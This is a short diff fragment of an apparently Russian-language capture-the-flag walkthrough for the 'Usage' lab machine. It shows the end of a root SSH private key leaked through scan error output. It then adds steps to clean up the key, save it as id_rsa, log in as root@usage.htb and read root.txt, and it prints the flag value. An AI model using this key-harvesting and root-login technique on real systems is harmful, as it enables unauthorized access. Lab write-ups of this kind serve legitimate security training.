@@ -347,7 +347,11 @@ H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
 Scan WARNINGS: 7
 
 
+Убираем из строк лишние " : No more files"
 
+сохраняем в файл id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa root@usage.htb
 
-
-
+root@usage:~# cat root.txt
+5b79d51aa2c18e291b54c26e4e7d870a
